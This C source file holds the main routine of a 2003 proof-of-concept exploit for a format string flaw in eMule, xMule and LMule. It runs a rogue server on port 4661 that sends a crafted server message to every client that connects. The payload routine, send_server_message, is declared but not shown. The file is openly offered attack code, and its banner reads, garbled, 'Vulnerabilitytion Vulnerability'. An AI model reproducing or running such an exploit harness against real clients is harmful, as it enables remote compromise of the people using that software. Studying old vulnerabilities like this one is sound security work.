
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int accept (int,int *,int ) ;
 int close (int) ;
 int fputs (char*,int ) ;
 int gai_perror (char const*) ;
 int perror (char*) ;
 int printf (char*,char const*,char const*) ;
 int puts (char*) ;
 scalar_t__ send_server_message (int) ;
 int socket_listen (char const*,char const*) ;
 int stdout ;
 int usage (char*) ;

int
main (int argc, char *argv[])
{
 puts ("eMule/xMule/LMule OP_SERVERMESSAGE "
   "Format String Vulnerabilitytion Vulnerability\n"
  "proof of concept code\n"
  "Copyright (C) 2003 RÃ©mi Denis-Courmont "
   "<exploit@simutrans.fr.st>\n");
 if (argc > 3)
  return usage (argv[0]);
 else
 {
  int listenfd;
  const char *host, *port;

  port = (argc < 2) ? "4661" : argv[2];
  host = (argc < 3) ? ((void*)0) : argv[3];
  printf ("Binding to [%s]:%s ...\n",
   (host != ((void*)0)) ? host : "any", port);
  listenfd = socket_listen (host, port);
  if (listenfd == -1)
  {
   gai_perror (host);
   return 1;
  }

  while (1)
  {
   int clientfd;

   fputs ("Waiting for a client to connect ... ", stdout);
   clientfd = accept (listenfd, ((void*)0), 0);
   if (clientfd == -1)
   {
    puts ("");
    perror ("Error");
    continue;
   }
   puts ("OK");
   fputs ("Sending server message ... ", stdout);
   if (send_server_message (clientfd))
   {
    puts ("");
    perror ("Error");
   }
   else
    puts ("Done");
   close (clientfd);
  }
 }

 return 0;
}
